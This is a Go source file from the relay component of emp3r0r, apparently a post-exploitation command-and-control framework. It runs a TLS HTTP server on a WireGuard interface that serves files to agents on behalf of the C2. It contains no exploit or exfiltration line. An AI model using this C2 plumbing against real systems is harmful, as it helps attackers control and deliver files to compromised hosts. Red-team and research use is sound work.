package relay

import (
	"fmt"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// This server handles relayed HTTP requests from C2, it listens on WireGuard interface
func RelayHTTP2Server() {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("RelayHTTP2Server panicked: %v", r)
		}
	}()
	time.Sleep(3 * time.Second)
	mux := http.NewServeMux()
	// Routes use fixed capability names — no malleable path config needed.
	mux.HandleFunc("/", dispatcher)
	listenAddr := fmt.Sprintf("%s:%d", netutil.WgOperatorIP, netutil.WgRelayedHTTPPort)
	err := http.ListenAndServeTLS(listenAddr, transport.OperatorServerCrtFile, transport.OperatorServerKeyFile, mux)
	if err != nil {
		logging.Errorf("Failed to start HTTP server: %v", err)
	}
}

func dispatcher(wrt http.ResponseWriter, req *http.Request) {
	logging.Debugf("Relayed request: %s %s", req.Method, req.URL.Path)
	// Extract capability from path: /{api}/{token}
	parts := strings.SplitN(strings.TrimPrefix(req.URL.Path, "/"), "/", 2)
	if len(parts) < 2 {
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}
	api := parts[0]
	token := parts[1]
	logging.Debugf("Got relayed request from C2: API: %s, token: %s", api, token)

	// network.ProxyStream uses sh.Secure now. Relay server still uses h2conn wrapper and needs migration.
	// For now, we decommission the legacy proxy path.

	switch api {
	case live.RuntimeConfig.C2Routes.FTP:
		logging.Errorf("Relay FTP is legacy and has been decommissioned. Please use the new pure-CBOR C2 transport.")
		wrt.WriteHeader(http.StatusNotImplemented)
	case live.RuntimeConfig.C2Routes.WWW:
		rawPath := req.URL.Query().Get("file_to_download")
		localized, err := util.SecureLocalPath(rawPath)
		if err != nil {
			logging.Warningf("Invalid download path %q: %v", rawPath, err)
			wrt.WriteHeader(http.StatusBadRequest)
			return
		}
		path := filepath.Base(localized)
		logging.Infof("PUT: got request for file: %s, URL: %s", path, req.URL)
		local_path := fmt.Sprintf("%s%s", live.WWWRoot, path)
		if !util.IsExist(local_path) {
			logging.Warningf("File %s not found", local_path)
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)
	case live.RuntimeConfig.C2Routes.Proxy:
		logging.Errorf("Relay Proxy/PortFwd is legacy and has been decommissioned. Please use the new pure-CBOR C2 transport.")
		wrt.WriteHeader(http.StatusNotImplemented)
	default:
		logging.Debugf("API not found: %s", api)
		wrt.WriteHeader(http.StatusNotFound)
	}
}

// WgFileServer serves a file over HTTP on WireGuard interface
func WgFileServer(path_to_file string) (err error) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(wrt http.ResponseWriter, req *http.Request) {
		http.ServeFile(wrt, req, path_to_file)
	})
	listenAddr := fmt.Sprintf("%s:%d", netutil.WgServerIP, netutil.WgFileServerPort)

	// retry until we can bind to the address (WireGuard interface might be slow to come up)
	for i := range 100 {
		err = http.ListenAndServe(listenAddr, mux)
		if err != nil {
			// suppress the error message for the first few seconds
			if i > 5 {
				logging.Warningf("WgFileServer: failed to listen on %s, retrying: %v", listenAddr, err)
			}
			time.Sleep(time.Second)
			continue
		}
	}

	return fmt.Errorf("WgFileServer: failed to listen on %s after 100 attempts: %v", listenAddr, err)
}
